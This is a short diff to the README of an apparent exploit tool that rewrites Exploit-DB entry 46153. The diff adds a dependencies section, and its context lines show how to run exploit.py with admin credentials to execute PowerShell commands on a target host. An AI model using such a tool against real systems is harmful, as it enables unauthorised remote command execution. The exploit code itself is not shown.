@@ -26,6 +26,17 @@ $ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c 
 $ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c powershell.exe -a '-NoProfile -Command ls'
 ```
 
+## Requirements
+
+- [Beautiful Soup](https://www.crummy.com/software/BeautifulSoup/index.html)
+- [Requests](https://requests.readthedocs.io/en/master/)
+
+Example for ArchLinux:
+
+```
+pacman -S python-beautifulsoup4 python-requests
+```
+
 ## Reference
 
 This is a better re-write of [EDB-ID-46153](https://www.exploit-db.com/exploits/46153) using arguments and with stdout display.
